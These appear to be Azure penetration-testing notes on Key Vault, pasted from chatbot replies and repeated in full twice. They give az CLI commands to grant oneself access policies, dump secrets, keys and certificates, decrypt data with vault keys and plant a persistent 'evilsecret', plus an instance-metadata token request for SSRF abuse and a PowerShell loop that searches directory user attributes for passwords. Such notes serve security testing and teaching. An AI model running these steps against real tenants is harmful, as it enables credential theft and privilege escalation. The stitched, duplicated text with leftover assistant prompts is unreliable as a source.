# Key Vault

## Key Vault Enumeration & Secret Extraction

**List all Key Vaults accessible to current identity:**

az keyvault list --query "\[\].name" -o tsv

**⚙️ Modify access policies (if you have contributor rights):**

az keyvault set-policy --name \<vault\> --upn \<your-user@domain.com\>
\\

--secret-permissions get list --key-permissions get list \\

--storage-permissions get list --certificate-permissions get list

**Enumerate and extract secrets:**

az keyvault secret list --vault-name \<vault-name\> --query "\[\].id" -o
tsv

\# Extract secret (returns JSON with value)

az keyvault secret show --id \<secret-id\>

**Abuse Tip:** If you have contributor access, escalate by granting
yourself access to keys/secrets.

**Managed Identity (MSI) Metadata Abuse**

MSI endpoints may expose access tokens usable for resource abuse.

**Get Access Token via Instance Metadata Service:**

GET
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

Header: Metadata: true

Useful to impersonate the VM’s identity to access Azure resources like
Key Vault, Storage, etc.

## Abuse Scenario: Contributor on Key Vault

If you’re **Contributor** on a Key Vault:

1.  Add yourself to the Access Policy.

2.  Dump all secrets/certs/keys using az or Get-AzKeyVaultSecret.

**⚙️ Additional Notes**

- Look for MSI tokens on misconfigured VM web apps or containers.

- Use tokens to query az rest -m GET -u \<url\> --headers
  "Authorization=Bearer \$token" for lateral movement.

- Consider abusing **automation accounts**, **runbooks**, and **logic
  apps**.

Here's your **corrected, summarized, and rewritten version** of the
**AWS Secrets Manager & KMS exploitation scenario**, adapted to **Azure
Key Vault** in the context of **Azure Penetration Testing**:

**🔐 Azure Key Vault – Pentest Guide (Adapted from AWS Secrets
Manager/KMS)**

**🧩 Overview**

- **Azure Key Vault** securely stores **secrets**, **keys**, and
  **certificates**.

- Supports **soft-delete**, **RBAC**, and **Access Policies** for
  granular control.

- Secrets can be exfiltrated if **permissions like get, list, or
  decrypt** are misconfigured.

- Keys used in Key Vault (like AWS KMS) can be **symmetric/asymmetric**
  and are used to encrypt/decrypt content.

**Enumeration**

**List all Key Vaults in the subscription:**

az keyvault list -o table

**List all secrets in a specific Key Vault:**

az keyvault secret list --vault-name \<VAULT_NAME\> -o table

**Get a specific secret’s value:**

az keyvault secret show --vault-name \<VAULT_NAME\> --name
\<SECRET_NAME\>

**List all keys stored in a Key Vault:**

az keyvault key list --vault-name \<VAULT_NAME\> -o table

**Get key details (includes key type & allowed operations):**

az keyvault key show --vault-name \<VAULT_NAME\> --name \<KEY_NAME\>

**List key versions:**

az keyvault key list-versions --vault-name \<VAULT_NAME\> --name
\<KEY_NAME\>

**🛡️ Access Control & Policies**

Azure Key Vault access is managed via:

1.  **Role-Based Access Control (RBAC)** – scoped to the vault or
    higher.

2.  **Access Policies** – set directly on the vault (older model, but
    still common).

**List access policies (if enabled):**

az keyvault show --name \<VAULT_NAME\> --query
"properties.accessPolicies"

**Check who has access to Key Vault via RBAC:**

az role assignment list --scope \$(az keyvault show --name
\<VAULT_NAME\> --query id -o tsv)

**☠️ Credential Exfiltration**

**If the current user/service principal has get or list permissions:**

Retrieve secrets:

az keyvault secret show --vault-name \<VAULT_NAME\> --name
\<SECRET_NAME\>

Retrieve keys (to decrypt blobs, tokens, etc.):

az keyvault key decrypt --name \<KEY_NAME\> --vault-name \<VAULT_NAME\>
--algorithm RSA-OAEP --value \<BASE64_ENCRYPTED_DATA\>

**🎯 Real-World Scenario**

- An Azure Function stores connection strings in Key Vault.

- Attacker compromises the Function identity or a misconfigured role.

- With get access, they dump secrets (DB creds, API tokens).

- If encrypted files are found in Blob Storage, use Key Vault keys to
  decrypt.

**🧰 Additional Commands**

**List Key Vault RBAC Roles:**

az role definition list --query "\[?contains(name, 'Key Vault')\]" -o
table

**Assign Key Vault Secret Reader Role (for exploitation in lab):**

az role assignment create --assignee \<PRINCIPAL_ID\> \\

--role "Key Vault Secrets User" \\

--scope \$(az keyvault show --name \<VAULT_NAME\> --query id -o tsv)

**🧪 Useful for Pentesters**

| **Exploit Target** | **Required Permission** | **Exploitation** |
|----|----|----|
| Secret Dump | get / list on secrets | Dump credentials, tokens, connection strings |
| Key Use | unwrapKey, decrypt | Decrypt encrypted blobs/files |
| Certificate Theft | get on certificates | Extract certificates & private keys |
| Misconfigured Access Policies | Wildcard principal or overly broad access | Persist or escalate access |

Would you like me to generate a script to automate Azure Key Vault
enumeration and secret dumping for offensive security testing?

Here’s your summarized and rewritten version in the context of Azure
Pentesting, covering Azure Key Vault and Key Management:

**🔐 Azure Key Vault & Secret Management - Pentesting Guide**

**Purpose:**\
Azure Key Vault securely stores secrets, keys, and certificates. It
integrates with Azure services to protect sensitive data and supports
hardware-backed key management via Azure-managed or customer-managed
keys.

**Enumeration**

**🔐 Key Vault Enumeration:**

az keyvault list -o table

Enumerates all accessible key vaults under the current Azure
subscription/account.

**🔑 Listing Secrets:**

az keyvault secret list --vault-name \<vault-name\> -o table

**📜 Getting Secret Value:**

az keyvault secret show --vault-name \<vault-name\> --name
\<secret-name\> --query value -o tsv

If misconfigured, this can reveal sensitive credentials like tokens,
connection strings, etc.

**🔑 Listing Keys:**

az keyvault key list --vault-name \<vault-name\> -o table

**Describing a Key:**

az keyvault key show --vault-name \<vault-name\> --name \<key-name\> -o
json

**🔒 Check Access Policies:**

az keyvault show --name \<vault-name\> --query
"properties.accessPolicies"

Identifies which users or apps have access to secrets or keys (important
for lateral movement or privilege escalation).

**🛠 Exploitation Scenarios**

**🎯 Secret Dumping:**

If the authenticated user has get permissions, secrets can be dumped and
used to:

- Access APIs, databases, or other cloud services

- Pivot into internal environments

**🔓 Key Usage:**

Stolen encrypted blobs (e.g., from Azure Storage or SQL) can be
decrypted if attacker has access to the associated Key Vault keys.

az keyvault key decrypt --vault-name \<vault-name\> --name \<key-name\>
--algorithm RSA-OAEP --value \<base64-ciphertext\>

Note: For symmetric keys, decryption is typically performed via Azure
services like SQL or Storage.

**🧬 Persistence**

An attacker with sufficient permissions could:

- Create new secrets

- Replace existing secrets with malicious payloads (e.g., backdoored
  credentials)

- Add new access policies granting themselves continued access

az keyvault secret set --vault-name \<vault-name\> --name evilsecret
--value hacked

**🧪 Test Script (Python):**

You can use this [automated Key Vault enumeration and secret dumping
script](sandbox://mnt/data/azure_kv_dump.py) to speed up your testing
process.

Would you like a similar script for keys or certificates in Azure Key
Vault?

## Key vaults

**Serverless and Cloud Services in Azure Penetration Testing**

In Azure, serverless computing, identity management, and cloud
infrastructure provide both opportunities and challenges for penetration
testers. Here are key areas of focus in an Azure PenTest:

**1. Azure Functions (Serverless Apps)**

- **Environment Variables and Secrets**: Serverless applications in
  Azure (Azure Functions) often use environment variables for
  configuration. While Azure best practices recommend using **Azure Key
  Vault** to securely store secrets, it's common to find plaintext
  values (e.g., connection strings) stored directly in the environment
  variables or within source code.

- **Access via Reader Role**: Accounts with **Reader** access to Azure
  Functions can still view these environment variables. Exploiting this
  can provide sensitive information, such as API keys or database
  credentials, aiding in further exploitation.

- **Exploitation Opportunity**: If secrets or sensitive data are stored
  inappropriately in the environment variables or source code, these can
  be extracted during an engagement.

**2. Instance Metadata Service (IMDS)**

- **Purpose and Accessibility**: Azure, like other cloud providers, uses
  an instance metadata service (IMDS) for cloud instances to retrieve
  essential information about their environment (e.g., instance
  identity, tokens, etc.). It's hosted at a non-routable IP
  (169.254.169.254), and ideally should only be accessible from the
  localhost.

- **SSRF Vulnerabilities**: If the server is compromised or there are
  **Server-Side Request Forgery (SSRF)** vulnerabilities, remote
  attackers could access the metadata endpoint, potentially exposing
  sensitive credentials or tokens used by the instance.

- **Example Token Request**: The metadata endpoint can provide OAuth
  tokens used for accessing Azure resources:

- http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

- **Exploitation**: Test for SSRF vulnerabilities or misconfigurations
  that allow an attacker to query this metadata service remotely and
  extract access tokens or other sensitive information.

**3. Azure AD User Attributes**

- **Sensitive Data in User Attributes**: Azure Active Directory (Azure
  AD) user attributes may contain sensitive data, such as credentials
  stored in description fields or comments. Penetration testers should
  investigate these attributes for potential password leakage or other
  sensitive information.

- **Script to Search User Attributes for Passwords**: You can use
  PowerShell to search Azure AD user attributes for any fields that may
  contain passwords:

- \$users = Get-MsolUser;

- foreach(\$user in \$users){

- \$props = @();

- \$user \| Get-Member \| foreach-object{\$props+=\$\_.Name};

- foreach(\$prop in \$props){

- if(\$user.\$prop-like "\*password\*"){

- Write-Output ("\[\*\]" + \$user.UserPrincipalName + "\[" + \$prop +
  "\]" + " : " + \$user.\$prop)

- }

- }

- }

- **Exploitation**: Scanning user attributes for potential passwords or
  credentials is a valuable tactic to find misconfigurations or careless
  security practices.

**4. Service Principal Hijacking**

- **Default Service Principals**: Azure Active Directory (AAD) has over
  200 default service principals in an Office 365 tenant, none of which
  are visible in the Azure GUI portal. These service principals often
  have varying levels of permissions via **Microsoft Graph**.

- **Privilege Escalation**: An **Application Administrator** can change
  passwords or certificates associated with service principals,
  including default ones. This means a compromised Application Admin
  role could lead to the hijacking of service principals, giving an
  attacker elevated privilege.

- **Exploitation**: Gaining access to the Application Administrator role
  can lead to service principal hijacking, allowing an attacker to
  escalate privileges or access sensitive data.

**5. Azure Key Vault**

- **Vault for Storing Secrets**: Azure Key Vault is used to store and
  manage secrets like passwords, API keys, and SSL/TLS certificates.
  While access to Key Vaults is restricted, users with **Contributor**
  roles or higher on the Key Vault can access its secrets.

- **Access Control**: By default, only the owner of a Key Vault can
  access the stored secrets. However, users with Contributor roles over
  the Key Vault can elevate their own access to retrieve secrets.

- **Exploitation**: If you have access to a Contributor or higher role
  on a Key Vault, you can retrieve sensitive data like database
  credentials or certificates, which can be critical for lateral
  movement or privilege escalation.

**6. Microsoft 365 Compliance Search**

- **Overview**: Microsoft 365 Compliance Search allows security
  administrators to search and report on data across Microsoft 365
  services such as Exchange email, SharePoint sites, Teams messages, and
  OneDrive accounts.

- **Required Permissions**: To use Compliance Search, an account must be
  a member of the **eDiscovery Manager** role group within the Security
  & Compliance Center. This role grants access to search across the
  entire Microsoft 365 suite.

- **Exploitation Opportunity**: If an attacker gains access to an
  **eDiscovery Manager** or similar role, they can search through large
  volumes of organizational data, potentially uncovering sensitive
  information (e.g., emails, documents, communications).

------------------------------------------------------------------------

By focusing on these serverless environments, metadata services, Azure
AD configurations, and key vaults, a penetration tester can identify
areas of weakness, misconfigurations, or improper access control that
can lead to significant security breaches in an Azure environment.
Exploiting these vulnerabilities can provide further access or escalate
privileges, making them key areas of investigation during an Azure
PenTest.

<img src="media/image1.png" style="width:6.91727in;height:3.35029in" />




### Key Vault Enumeration & Secret Extraction

**List all Key Vaults accessible to current identity:**

az keyvault list --query "\[\].name" -o tsv

**⚙️ Modify access policies (if you have contributor rights):**

az keyvault set-policy --name \<vault\> --upn \<your-user@domain.com\>
\\

--secret-permissions get list --key-permissions get list \\

--storage-permissions get list --certificate-permissions get list

**Enumerate and extract secrets:**

az keyvault secret list --vault-name \<vault-name\> --query "\[\].id" -o
tsv

\# Extract secret (returns JSON with value)

az keyvault secret show --id \<secret-id\>

**Abuse Tip:** If you have contributor access, escalate by granting
yourself access to keys/secrets.

**Managed Identity (MSI) Metadata Abuse**

MSI endpoints may expose access tokens usable for resource abuse.

**Get Access Token via Instance Metadata Service:**

GET
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

Header: Metadata: true

Useful to impersonate the VM’s identity to access Azure resources like
Key Vault, Storage, etc.

## Abuse Scenario: Contributor on Key Vault

If you’re **Contributor** on a Key Vault:

1.  Add yourself to the Access Policy.

2.  Dump all secrets/certs/keys using az or Get-AzKeyVaultSecret.

**⚙️ Additional Notes**

- Look for MSI tokens on misconfigured VM web apps or containers.

- Use tokens to query az rest -m GET -u \<url\> --headers
  "Authorization=Bearer \$token" for lateral movement.

- Consider abusing **automation accounts**, **runbooks**, and **logic
  apps**.

Here's your **corrected, summarized, and rewritten version** of the
**AWS Secrets Manager & KMS exploitation scenario**, adapted to **Azure
Key Vault** in the context of **Azure Penetration Testing**:

**🔐 Azure Key Vault – Pentest Guide (Adapted from AWS Secrets
Manager/KMS)**

**🧩 Overview**

- **Azure Key Vault** securely stores **secrets**, **keys**, and
  **certificates**.

- Supports **soft-delete**, **RBAC**, and **Access Policies** for
  granular control.

- Secrets can be exfiltrated if **permissions like get, list, or
  decrypt** are misconfigured.

- Keys used in Key Vault (like AWS KMS) can be **symmetric/asymmetric**
  and are used to encrypt/decrypt content.

**Enumeration**

**List all Key Vaults in the subscription:**

az keyvault list -o table

**List all secrets in a specific Key Vault:**

az keyvault secret list --vault-name \<VAULT_NAME\> -o table

**Get a specific secret’s value:**

az keyvault secret show --vault-name \<VAULT_NAME\> --name
\<SECRET_NAME\>

**List all keys stored in a Key Vault:**

az keyvault key list --vault-name \<VAULT_NAME\> -o table

**Get key details (includes key type & allowed operations):**

az keyvault key show --vault-name \<VAULT_NAME\> --name \<KEY_NAME\>

**List key versions:**

az keyvault key list-versions --vault-name \<VAULT_NAME\> --name
\<KEY_NAME\>

**🛡️ Access Control & Policies**

Azure Key Vault access is managed via:

1.  **Role-Based Access Control (RBAC)** – scoped to the vault or
    higher.

2.  **Access Policies** – set directly on the vault (older model, but
    still common).

**List access policies (if enabled):**

az keyvault show --name \<VAULT_NAME\> --query
"properties.accessPolicies"

**Check who has access to Key Vault via RBAC:**

az role assignment list --scope \$(az keyvault show --name
\<VAULT_NAME\> --query id -o tsv)

**☠️ Credential Exfiltration**

**If the current user/service principal has get or list permissions:**

Retrieve secrets:

az keyvault secret show --vault-name \<VAULT_NAME\> --name
\<SECRET_NAME\>

Retrieve keys (to decrypt blobs, tokens, etc.):

az keyvault key decrypt --name \<KEY_NAME\> --vault-name \<VAULT_NAME\>
--algorithm RSA-OAEP --value \<BASE64_ENCRYPTED_DATA\>

**🎯 Real-World Scenario**

- An Azure Function stores connection strings in Key Vault.

- Attacker compromises the Function identity or a misconfigured role.

- With get access, they dump secrets (DB creds, API tokens).

- If encrypted files are found in Blob Storage, use Key Vault keys to
  decrypt.

**🧰 Additional Commands**

**List Key Vault RBAC Roles:**

az role definition list --query "\[?contains(name, 'Key Vault')\]" -o
table

**Assign Key Vault Secret Reader Role (for exploitation in lab):**

az role assignment create --assignee \<PRINCIPAL_ID\> \\

--role "Key Vault Secrets User" \\

--scope \$(az keyvault show --name \<VAULT_NAME\> --query id -o tsv)

**🧪 Useful for Pentesters**

| **Exploit Target** | **Required Permission** | **Exploitation** |
|----|----|----|
| Secret Dump | get / list on secrets | Dump credentials, tokens, connection strings |
| Key Use | unwrapKey, decrypt | Decrypt encrypted blobs/files |
| Certificate Theft | get on certificates | Extract certificates & private keys |
| Misconfigured Access Policies | Wildcard principal or overly broad access | Persist or escalate access |

Would you like me to generate a script to automate Azure Key Vault
enumeration and secret dumping for offensive security testing?

Here’s your summarized and rewritten version in the context of Azure
Pentesting, covering Azure Key Vault and Key Management:

**🔐 Azure Key Vault & Secret Management - Pentesting Guide**

**Purpose:**\
Azure Key Vault securely stores secrets, keys, and certificates. It
integrates with Azure services to protect sensitive data and supports
hardware-backed key management via Azure-managed or customer-managed
keys.

**Enumeration**

**🔐 Key Vault Enumeration:**

az keyvault list -o table

Enumerates all accessible key vaults under the current Azure
subscription/account.

**🔑 Listing Secrets:**

az keyvault secret list --vault-name \<vault-name\> -o table

**📜 Getting Secret Value:**

az keyvault secret show --vault-name \<vault-name\> --name
\<secret-name\> --query value -o tsv

If misconfigured, this can reveal sensitive credentials like tokens,
connection strings, etc.

**🔑 Listing Keys:**

az keyvault key list --vault-name \<vault-name\> -o table

**Describing a Key:**

az keyvault key show --vault-name \<vault-name\> --name \<key-name\> -o
json

**🔒 Check Access Policies:**

az keyvault show --name \<vault-name\> --query
"properties.accessPolicies"

Identifies which users or apps have access to secrets or keys (important
for lateral movement or privilege escalation).

**🛠 Exploitation Scenarios**

**🎯 Secret Dumping:**

If the authenticated user has get permissions, secrets can be dumped and
used to:

- Access APIs, databases, or other cloud services

- Pivot into internal environments

**🔓 Key Usage:**

Stolen encrypted blobs (e.g., from Azure Storage or SQL) can be
decrypted if attacker has access to the associated Key Vault keys.

az keyvault key decrypt --vault-name \<vault-name\> --name \<key-name\>
--algorithm RSA-OAEP --value \<base64-ciphertext\>

Note: For symmetric keys, decryption is typically performed via Azure
services like SQL or Storage.

**🧬 Persistence**

An attacker with sufficient permissions could:

- Create new secrets

- Replace existing secrets with malicious payloads (e.g., backdoored
  credentials)

- Add new access policies granting themselves continued access

az keyvault secret set --vault-name \<vault-name\> --name evilsecret
--value hacked

**🧪 Test Script (Python):**

You can use this [automated Key Vault enumeration and secret dumping
script](sandbox://mnt/data/azure_kv_dump.py) to speed up your testing
process.

Would you like a similar script for keys or certificates in Azure Key
Vault?

## Key vaults

**Serverless and Cloud Services in Azure Penetration Testing**

In Azure, serverless computing, identity management, and cloud
infrastructure provide both opportunities and challenges for penetration
testers. Here are key areas of focus in an Azure PenTest:

**1. Azure Functions (Serverless Apps)**

- **Environment Variables and Secrets**: Serverless applications in
  Azure (Azure Functions) often use environment variables for
  configuration. While Azure best practices recommend using **Azure Key
  Vault** to securely store secrets, it's common to find plaintext
  values (e.g., connection strings) stored directly in the environment
  variables or within source code.

- **Access via Reader Role**: Accounts with **Reader** access to Azure
  Functions can still view these environment variables. Exploiting this
  can provide sensitive information, such as API keys or database
  credentials, aiding in further exploitation.

- **Exploitation Opportunity**: If secrets or sensitive data are stored
  inappropriately in the environment variables or source code, these can
  be extracted during an engagement.

**2. Instance Metadata Service (IMDS)**

- **Purpose and Accessibility**: Azure, like other cloud providers, uses
  an instance metadata service (IMDS) for cloud instances to retrieve
  essential information about their environment (e.g., instance
  identity, tokens, etc.). It's hosted at a non-routable IP
  (169.254.169.254), and ideally should only be accessible from the
  localhost.

- **SSRF Vulnerabilities**: If the server is compromised or there are
  **Server-Side Request Forgery (SSRF)** vulnerabilities, remote
  attackers could access the metadata endpoint, potentially exposing
  sensitive credentials or tokens used by the instance.

- **Example Token Request**: The metadata endpoint can provide OAuth
  tokens used for accessing Azure resources:

- http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

- **Exploitation**: Test for SSRF vulnerabilities or misconfigurations
  that allow an attacker to query this metadata service remotely and
  extract access tokens or other sensitive information.

**3. Azure AD User Attributes**

- **Sensitive Data in User Attributes**: Azure Active Directory (Azure
  AD) user attributes may contain sensitive data, such as credentials
  stored in description fields or comments. Penetration testers should
  investigate these attributes for potential password leakage or other
  sensitive information.

- **Script to Search User Attributes for Passwords**: You can use
  PowerShell to search Azure AD user attributes for any fields that may
  contain passwords:

- \$users = Get-MsolUser;

- foreach(\$user in \$users){

- \$props = @();

- \$user \| Get-Member \| foreach-object{\$props+=\$\_.Name};

- foreach(\$prop in \$props){

- if(\$user.\$prop-like "\*password\*"){

- Write-Output ("\[\*\]" + \$user.UserPrincipalName + "\[" + \$prop +
  "\]" + " : " + \$user.\$prop)

- }

- }

- }

- **Exploitation**: Scanning user attributes for potential passwords or
  credentials is a valuable tactic to find misconfigurations or careless
  security practices.

**4. Service Principal Hijacking**

- **Default Service Principals**: Azure Active Directory (AAD) has over
  200 default service principals in an Office 365 tenant, none of which
  are visible in the Azure GUI portal. These service principals often
  have varying levels of permissions via **Microsoft Graph**.

- **Privilege Escalation**: An **Application Administrator** can change
  passwords or certificates associated with service principals,
  including default ones. This means a compromised Application Admin
  role could lead to the hijacking of service principals, giving an
  attacker elevated privilege.

- **Exploitation**: Gaining access to the Application Administrator role
  can lead to service principal hijacking, allowing an attacker to
  escalate privileges or access sensitive data.

**5. Azure Key Vault**

- **Vault for Storing Secrets**: Azure Key Vault is used to store and
  manage secrets like passwords, API keys, and SSL/TLS certificates.
  While access to Key Vaults is restricted, users with **Contributor**
  roles or higher on the Key Vault can access its secrets.

- **Access Control**: By default, only the owner of a Key Vault can
  access the stored secrets. However, users with Contributor roles over
  the Key Vault can elevate their own access to retrieve secrets.

- **Exploitation**: If you have access to a Contributor or higher role
  on a Key Vault, you can retrieve sensitive data like database
  credentials or certificates, which can be critical for lateral
  movement or privilege escalation.

**6. Microsoft 365 Compliance Search**

- **Overview**: Microsoft 365 Compliance Search allows security
  administrators to search and report on data across Microsoft 365
  services such as Exchange email, SharePoint sites, Teams messages, and
  OneDrive accounts.

- **Required Permissions**: To use Compliance Search, an account must be
  a member of the **eDiscovery Manager** role group within the Security
  & Compliance Center. This role grants access to search across the
  entire Microsoft 365 suite.

- **Exploitation Opportunity**: If an attacker gains access to an
  **eDiscovery Manager** or similar role, they can search through large
  volumes of organizational data, potentially uncovering sensitive
  information (e.g., emails, documents, communications).

------------------------------------------------------------------------

By focusing on these serverless environments, metadata services, Azure
AD configurations, and key vaults, a penetration tester can identify
areas of weakness, misconfigurations, or improper access control that
can lead to significant security breaches in an Azure environment.
Exploiting these vulnerabilities can provide further access or escalate
privileges, making them key areas of investigation during an Azure
PenTest.

<img src="media/image1.png" style="width:6.91727in;height:3.35029in" />
